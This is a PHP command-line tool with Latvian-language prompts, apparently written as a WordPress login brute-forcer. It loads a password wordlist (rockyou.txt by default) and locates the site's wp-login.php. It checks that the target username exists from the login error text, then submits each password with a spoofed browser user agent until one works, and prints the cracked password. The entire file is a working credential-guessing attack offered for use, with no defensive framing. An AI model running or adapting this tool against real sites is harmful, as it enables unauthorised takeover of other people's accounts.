#!/usr/bin/env php
<?php
    /**
     * @package WordPress BruteForce
     * @author  Yuu Hirokabe (www.yuuhiroka.be)
     */
    class Wordpress{
        /**
         * @var string  $default
         */
        private string $default    = '/mnt/d/Dev/rockyou.txt';
        /**
         * @var string  $filename
         */
        private string $fileName;
        /**
         * @var resource  $file
         */
        private $file;
        /**
         * @var string  $url
         */
        private string $url;
        /**
         * @var string  $username
         */
        private string $user;
        /**
         * @var bool    $bruteForce
         */
        private bool $bruteForce = True;
        /**
         * @var string  $user_agent
         */
        private string $user_agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19';
        /**
         * @return void
         */
        public function __construct(){
            system('clear');
            print <<<EOT
            \n
                  ███▄    █ ▓█████  ███▄ ▄███▓▓█████  ▄████▄   ██░ ██  ▄▄▄       ███▄    █ 
                  ██ ▀█   █ ▓█   ▀ ▓██▒▀█▀ ██▒▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒▒████▄     ██ ▀█   █ 
                 ▓██  ▀█ ██▒▒███   ▓██    ▓██░▒███   ▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒
                 ▓██▒  ▐▌██▒▒▓█  ▄ ▒██    ▒██ ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
                 ▒██░   ▓██░░▒████▒▒██▒   ░██▒░▒████▒▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░
                 ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒░   ░  ░░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
                 ░ ░░   ░ ▒░ ░ ░  ░░  ░      ░ ░ ░  ░  ░  ▒    ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░
                    ░   ░ ░    ░   ░      ░      ░   ░         ░  ░░ ░  ░   ▒      ░   ░ ░ 
                          ░    ░  ░       ░      ░  ░░ ░       ░  ░  ░      ░  ░         ░ 
                                                     ░                                     \n
            EOT;
            $this->read ();     # Setting wordlist
            $this->setUrl ();   # Setting wordpress site url
            $this->setUser ();  # Setting username
            $this->_run ();     # Starting brute force
        }
        /**
         * Reading wordlist
         * 
         * @return void
         */
        private function read(){
            $filename               = readline('Ievadi ceļu uz vārdnīcu (Atstāj tukšu - noklusējuma): ');
            if ($filename && file_exists($filename)){ // custom wordlist
                $this->fileName     = basename($filename);
                print               "\033[35m[~] Notiek vārdnīcas  {$this->fileName} ielāde, lūdzu uzgaidiet...\033[0m\n";
                $this->file         = fopen($filename, 'r');
                print               "\033[32m{$this->fileName} ielādēts veiksmīgi...\033[0m\n";
            } else { // default wordlist
                $this->fileName     = basename($this->default);
                print               "\033[35m[~] Notiek vārdnīcas {$this->fileName} ielāde, lūdzu uzgaidiet...\033[0m\n";
                if (file_exists($this->default)){
                    $this->file     = fopen($this->default, 'r');
                    print           "\033[32m{$this->fileName} ielādēts veiksmīgi...\033[0m\n";
                } else {
                    $filename       = basename($this->default);
                    print           "\033[31m[!] Vārdnīca {$filename} nav atrasta...\033[0m\n";
                    exit;
                }
            }
        }
        /**
         * Checking if WP exists
         * 
         * @return void
         */
        private function checkWP(){
            $possibles = ['wp-login.php','wp-admin','wp/wp-login.php','wordpress/wp-login.php'];
            foreach ($possibles as $possible){
                $check          = @file_get_contents($this->url . '/' . $possible);
                if (!empty($check) && strpos($check, 'Powered by WordPress')){
                    $this->url  = $this->url . '/' . $possible;
                }
            }
        }
        /**
         * Setting WP Site to brute force
         * 
         * @return void
         */
        private function setUrl(){
            $url            = readline('Ievadi WordPress lapas saiti: ');
            $this->url      = $url;
            $alive          = @file_get_contents($this->url);
            if(empty($alive)){
                print       "\033[31m***\n";
                print       "* Lapa nav sasniedzama !!!\n";
                print       "* Pārliecinies, vai uzrakstīji saiti pareizi...\n";
                print       "***\033[0m\n";
                exit;
            } else $this->checkWP();
        }
        /**
         * Setting username to bruteforce
         * 
         * @return void
         */
        private function setUser(){
            $username       = readline('Ievadi lietotājvārdu, kuru vēlies uzlaust: ');
            if (empty($username)){
                print       "\033[31m***\n";
                print       "* Ievadi lietotājvārdu !!!\n";
                print       "***\033[0m\n";
                return $this->setUser();
            } else {
                // Testing if user exists
                $curl       = curl_init($this->url);
                curl_setopt_array($curl, [
                    CURLOPT_POST => TRUE,
                    CURLOPT_POSTFIELDS => ['log' => $username, 'pwd' => '#testing'],
                    CURLOPT_RETURNTRANSFER => TRUE,
                    CURLOPT_HTTPHEADER => ['User-Agent' => $this->user_agent]
                ]);
                $result     = curl_exec($curl);
                curl_close($curl);
                if (strpos($result, 'Unknown username')){
                    print   "\033[31m***\n";
                    print   "* Lietotājs '{$username}' neeksistē !!!\n";
                    print   "***\033[0m\n";
                    return $this->setUser();
                } else $this->user = $username;
            }
        }
        /**
         * Starting brute force attack
         * 
         * @return void
         */
        private function _run(){
            $start_time     = time();
            $passwords_test = 0;
            while (!feof($this->file) && $this->bruteForce == true){
                $password = explode("\n", fread($this->file, 4096));
                foreach ($password as $pass){
                    $passwords_test++;
                    $curl   = curl_init ($this->url);
                    curl_setopt_array($curl, [
                        CURLOPT_POST            => TRUE,
                        CURLOPT_POSTFIELDS      => ['log' => $this->user, 'pwd' => $pass],
                        CURLOPT_RETURNTRANSFER  => TRUE,
                        CURLOPT_HTTPHEADER => ['User-Agent' => $this->user_agent]
                    ]);
                    $result = curl_exec($curl);
                    if (strpos($result, '<div id="login_error">')){
                        print   "\033[34m[~] Mēģina paroli {$pass}, #{$passwords_test} nav pareiza..\033[0m\n";
                    } else {
                        $finish         = time() - $start_time;
                        $minutes        = round($finish / 60);
                        $seconds        = round($finish % 60);
                        print           "\033[32m***\n";
                        print           "* PAROLE ATRASTA !!!\n*\n";
                        print           "* {$pass}:" . MD5($pass) . "\n";
                        print           "* Pagājušais laiks: {$minutes}min. & {$seconds}sec.\n";
                        print           "* Kopā tika izmēģinātas {$passwords_test} paroles\n";
                        print           "***\033[0m\n";
                        $this->bruteForce = False;
                        break;break;
                    }
                }
            }
        }
    }

    $wordpress = new Wordpress;